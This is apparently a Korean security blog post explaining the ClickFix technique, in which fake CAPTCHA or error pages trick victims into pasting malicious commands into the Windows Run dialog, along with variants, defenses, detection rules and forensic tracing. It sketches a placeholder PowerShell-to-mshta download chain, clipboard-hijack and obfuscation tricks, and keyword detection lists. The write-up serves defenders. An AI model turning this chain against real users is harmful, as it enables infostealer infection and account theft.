ClickFix: Fake CAPTCHA, Error page, 업데이트 안내 등으로 피해자를 속여 악성 명령어를 직접 복사·붙여넣기해서 실행하게 만드는 사회공학 기법

이번 Black Hat USA 2026에 참가했을 때, Business hall의 ESET 부스에서 ClickFix → 스테이저 → Lumma Stealer 다운로드로 이어지는 감염 체인 전 과정을 EDR로 탐지하는 데모를 봤는데 현업에서도 자주 마주치는 Initial Access 기법이라 정리함.

## 개념 및 배경

전통적인 멀웨어 유포는 첨부파일이나 다운로드 링크를 통해서 메일 게이트웨이, 브라우저 다운로드 경고, EDR의 파일 평판 같은 지점에서 걸러낼 여지가 있다.

ClickFix는 피해자가 Win+R로 직접 PowerShell을 띄우고, 직접 명령을 붙여넣고, 직접 엔터를 치기 때문에 OS 입장에서는 그냥 사용자가 한 정상적인 조작이다.

2023년 10월 처음 등장했고, 2025~2026년 들어 폭증하며 사실상 Initial Access의 주류 기법 중 하나로 자리잡았다. MITRE ATT&CK에도 `T1204.004 (User Execution: Malicious Copy and Paste)` 로 등재되어 있다.

ClickFix는 MaaS로 운영된다.

| 항목 | 내용 |
|---|---|
| 판매 형태 | $250/월, $1,800 평생 라이선스(업데이트 포함) |
| 상위 패키지 | lure 템플릿, 도메인 로테이션, AV 우회 보장, Telegram 지원 |
| 대표 페이로드 | Lumma Stealer, DarkGate, XWorm, AsyncRAT, NetSupport, SectopRAT |

### 변종

사용자가 직접 실행다는 기본 틀은 그대로 두고 붙여넣는 위치와 미끼만 바꾼 변종이 계속 나오고 있다.

| 변종 | 특징 |
|---|---|
| FileFix | Windows 탐색기 주소창에 붙여넣게 유도 |
| CrashFix | 브라우저를 의도적으로 크래시시킨 뒤 "복구" 명령 제시 (2026.01) |
| PromptFix | AI 도구/어시스턴트를 타깃 |
| ConsentFix | OAuth 동의 화면을 악용해 계정 탈취 |
| macOS 변종 | Terminal 또는 `applescript://` URI 스킴 이용 (2026.04) |

Apple은 2026년 3월 macOS에 ClickFix류 공격에 대한 완화책을 추가했고, 공격자는 바로 다음 달 Terminal을 거치지 않는 `applescript://` 변종으로 대응했다.

## 동작 방식

공격자는 직접 악성 도메인을 만들기도 하지만, 정상 웹사이트를 침해해서 심어두는 경우가 많다. CMS 취약 플러그인이나 탈취한 관리자 계정으로 침투한 뒤, 페이지에 악성 JS를 삽입하거나 가짜 인증 레이어를 씌운다. 

이렇게 침해된 정상 사이트는 평판이 좋아 필터링을 피하기 쉽다. 여기에 malvertising, SEO poisoning, watering hole, phishing 등으로 트래픽을 끌어온다.

그 이후는
1. 피해자가 lure 페이지 접속
2. "Verify you are human" 같은 Fake UI 클릭
3. 클릭 시 페이지 JS가 클립보드에 악성 명령 복사
4. 페이지 안내에 따라 `Win+R → Ctrl+V → Enter`
5. 그대로 실행 → 감염

3번 Clipboard Hijacking의 경우 `document.execCommand("copy")`(또는 Clipboard API)로 사용자 클릭 이벤트에 묶어 명령을 복사한다. 

대화창에는 클립보드 내용의 첫 줄만 보이기 때문에, 실제로는 긴 악성 명령인데도

```
✓ "I am a human - Cloudflare RayID: 9802b213d92d0eaa"
```

뒤에 이어지는 진짜 명령은 공백이나 주석으로 화면 밖으로 밀어내서 무해해 보이는 문자열 한 줄만 노출되게 만든다.

전형적인 실행 체인은 

```
powershell -w 1 -ep Unrestricted -eC <base64>
  → mshta hxxp://<staging>/loader
    → (스테이저 JS) WScript.Shell로 다운로더 실행
      → %TEMP% 마커 확인 후 아카이브 다운로드·압축해제·실행
        → infostealer
```

**난독화 패턴**

- PowerShell: `-eC`로 base64 인코딩 명령 전달, `-w 1`(숨김), `-ep Unrestricted`, `-noP`
- URL/문자열을 숫자 배열로 숨긴 뒤 상수를 빼서 ASCII로 복원
- mshta: 정상 Windows 바이너리 뒤에 `<script>`를 덧붙여, 파일 자체는 멀쩡해 보이게 함
- `String.fromCharCode()`로 복원되는 10진수 인코딩 문자열

정적 탐지가 어려워 행위 기반으로 방어해야 함.

## 방어

**사용자 / 인식 관점**

- 정상적인 웹 인증은 터미널을 요구하지 않으므로 교육을 통해 안내 필요

**엔드포인트 / 정책 관점**

| 통제 | 방법 |
|---|---|
| Run 대화창 차단 | GPO `NoRun`, 또는 `DisallowRun`으로 불필요 사용자 그룹 제한 |
| 스크립트 호스트 제한 | mshta, wscript, cscript 사용 제한/감사 |
| PowerShell | Constrained Language Mode, Script Block Logging(4104), Module Logging 활성화 |
| 실행 통제 | AppLocker / WDAC로 explorer 자식 스크립트 실행 제한 |

**탐지 관점**

- `HKCU\...\Explorer\RunMRU` — Run에 입력된 이력 (난독화 문자열, 외부 도메인 다운로드 키워드)
- 프로세스: `explorer.exe` → `powershell.exe`/`mshta.exe`/`cmd.exe` (Event ID 4688)
- 대화형 로그온 직후의 PowerShell 실행 + 외부 연결 + `certutil`, `mshta`, `rundll32` 등 자식 프로세스
- 네트워크: URL/DNS 필터링으로 JS가 클립보드에 주입하는 악성 명령/스테이징 도메인 차단

**브라우저 관점**

- `ClickFix Block` 같은 확장프로그램은 클립보드 쓰기에서 `mshta`, `powershell`, `iex`, `not a robot` 등 키워드를 탐지해 경고·차단

**EDR 관점**

대부분 페이로드 자체보다 RunMRU → 스크립트 호스트 실행이라는 행위 패턴을 봄

- Elastic Security: `Potential ClickFix Command via Windows Run Dialog` 룰(RunMRU 기반) 기본 제공
- Microsoft Defender: RunMRU 의심 명령 탐지
- 그 외 EDR/XDR들도 explorer → powershell/mshta 계보와 클립보드-실행 상관관계를 behavioral rule로 커버

## 역추적 및 분석

ClickFix는 체인이 길어서, 역으로 따라가면 lure 페이지 → 스테이징 → C2 → MaaS 운영자까지 피벗할 여지가 많다.

**1. lure 페이지 분석**

- 페이지 JS에서 클립보드 쓰기(`execCommand('copy')`, `navigator.clipboard.writeText`) 찾기
- 위장용 diversion 문자열과 실제 명령 분리

**2. 페이로드 디코딩**

- PowerShell `-eC` 뒤 base64 → 디코딩
- `String.fromCharCode()` / 숫자 배열 + 상수 연산 → 복원
- 복원된 명령에서 스테이징/C2 URL 추출

**3. 인프라 피벗**

- 추출한 도메인/IP로 passive DNS, 인증서, 호스팅 피벗
- lure 템플릿의 재사용(동일 RayID 형식, 동일 JS 구조)으로 캠페인 클러스터링

**4. 호스트 아티팩트**

RunMRU, PowerShell 4104 로그(디코딩된 스크립트 블록), Browser History(최초 lure 페이지 유입 경로), `%TEMP%`의 마커/아카이브(다운로더가 남긴 스테이지 흔적) 

**5. 운영자 추적**

MaaS는 백엔드를 공유하기 때문에, 운영자의 OPSEC 실수로 전체가 노출될 수 있다. ([2026.4 Netskope Threat Labs 사례](https://www.helpnetsecurity.com/2026/07/15/clickfix-social-engineering-attacks-report/))
